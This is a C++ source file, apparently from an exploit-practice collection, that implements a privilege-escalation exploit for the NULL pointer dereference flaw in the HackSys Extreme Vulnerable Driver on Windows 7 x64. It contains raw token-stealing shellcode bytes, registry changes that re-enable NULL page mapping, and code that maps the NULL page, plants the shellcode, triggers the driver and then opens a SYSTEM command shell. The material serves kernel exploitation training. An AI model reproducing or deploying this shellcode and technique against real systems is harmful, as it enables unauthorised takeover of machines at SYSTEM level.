#include "Common.h"
#include "Exploits.h"

/*
	HEVD Null Pointer Dereference / Medium Integrity

	Author : @xct_de
	Target : Win7 x64

	In Windows 7, there's a flaw that allows to map NULL pages using the NtAllocateVirtualMemory call.
	This only works on pre SP1 versions on x64 since they backported the patch there.

	We can however enable it as admin (useful for practice): 
	- Create Key: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\exploit.exe
	- Create REG_DWORD EnableLowVaAccess: 1
	- Create in REG_DWORD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management new REG_DOWRD EnableLowVaAccess: 1
	- Reboot
*/
namespace HevdNullPointerMIWin7x64NS {
	
	HANDLE hDriver;
	DWORD bytesRet;

	typedef struct _WriteWhatWhereBuffer
	{
		uintptr_t what;
		uintptr_t where;
	} WriteWhatWhereBuffer;

	// Token Stealing Payload Win7 x64
	BYTE sc[256] = {
	  0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
	  0x00, 0x48, 0x8b, 0x40, 0x70, 0x48, 0x89, 0xc1, 0x49, 0x89,
	  0xcb, 0x49, 0x83, 0xe3, 0x07, 0xba, 0x04, 0x00, 0x00, 0x00,
	  0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x2d, 0x88,
	  0x01, 0x00, 0x00, 0x48, 0x39, 0x90, 0x80, 0x01, 0x00, 0x00,
	  0x75, 0xea, 0x48, 0x8b, 0x90, 0x08, 0x02, 0x00, 0x00, 0x48,
	  0x83, 0xe2, 0xf0, 0x4c, 0x09, 0xda, 0x48, 0x89, 0x91, 0x08,
	  0x02, 0x00, 0x00, 0xc3, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	void Exploit(int argc, char** argv) {
		hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE)
		{
			printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
			exit(1);
		}

		// VirtualAlloc can *not* do it anymore on windows 7 x64 from a certain patch level onwards as the null page protection was backported
		// ZwAllocateVirtualMemory can do it up to Win7 x64 SP1 and up to Win7 x86 (any SP)
		// Ref: https://cdn2.hubspot.net/hubfs/4598121/PART-ONE-Windows-Kernel-Info-Leak-Investigating-Microsoft-Vulnerability-CVE-2019-1169-VerSprite-Research.pdf
		ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwAllocateVirtualMemory");

		PVOID baseAddr = (PVOID)0x1; // can not be null
		SIZE_T regionSize = 0x1000;

		printf("[>] Allocating Null Page\n");
		NTSTATUS status = _ZwAllocateVirtualMemory(GetCurrentProcess(), &baseAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE		);
		if (status != STATUS_SUCCESS) {
			printf("[!] Could not allocated null page %lx\n", status);
			return;
		}

		RtlCopyMemory((void*)0x100, sc, sizeof(sc));
		*(QWORD*)0x8 = 0x100;

		BYTE dummy[1024];
		if (!DeviceIoControl(hDriver, IOCTL(0x80A), dummy, sizeof(dummy), NULL, 0, NULL, NULL)) {
			printf("[!] Null Ptr Dereference failed\n");
		}

		printf("[>] Enjoy your shell!\n");
		system("cmd");
		return;
	}
}


int HevdNullPointerMIWin7x64(int argc, char** argv) {
	printf("-----------------------------------------\n");
	printf("  Running HEVD Null Pointer Dereference  \n");
	printf("-----------------------------------------\n");
	HevdNullPointerMIWin7x64NS::Exploit(argc, argv);
	return 0;
}